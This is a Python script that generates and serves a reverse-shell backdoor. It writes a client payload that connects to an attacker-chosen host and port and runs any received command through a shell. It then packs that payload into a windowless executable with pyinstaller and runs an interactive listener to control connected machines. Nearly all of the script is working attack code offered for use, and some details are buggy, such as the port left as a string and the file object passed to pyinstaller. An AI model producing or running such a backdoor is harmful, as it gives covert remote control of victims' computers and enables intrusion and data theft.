import socket
import sys
from colorama import Fore
import os
import time

red = Fore.RED
green = Fore.GREEN
blue = Fore.LIGHTBLUE_EX


print(blue)
choose_host = input("Enter Host: ")
choose_port = input("(Recommend Port: 4444)Enter Port: ")
if len(choose_port) == 0:
    choose_port = 4444
file_name = input("(As you like)Enter File Name: ")

file_create = open(file_name + '.py', "w")
file_create.write("""
import os
import socket
import subprocess

""")
file_create.write(f"""
host_command = '{choose_host}'
port_command = {choose_port}
""")
file_create.write("""

s = socket.socket()
host = host_command
port = port_command
s.connect((host, port))


def hack_it():
    data = s.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd())))


while True:
    hack_it()


""")

file_create.close()
print("Creating Exe File....")
time.sleep(3)
os.system(f"pyinstaller --onefile -w {file_create}")

host = choose_host
port = choose_port


# create socket
def socket_create():
    try:
        global s
        s = socket.socket()
    except socket.error:
        print(red)
        print("Error occur while creating socket")


def socket_bind():
    try:

        print(green)
        print(f"Server Starting On Port {port}!")
        s.bind((host, port))
        s.listen(5)
    except socket.error:
        print(f"{red}Error occur while binding socket! {green}(Retrying!)")

        socket_bind()


def socket_accept():
    server, adr = s.accept()
    print(green)
    print(f"{adr} Connected")
    send_command(server)
    server.close()


def send_command(server):
    while True:
        print(blue)
        cmd = input("command>")
        if cmd == 'quit':
            server.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            server.send(str.encode(cmd))
            respond = str(server.recv(1024), 'utf-8')
            print(respond, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()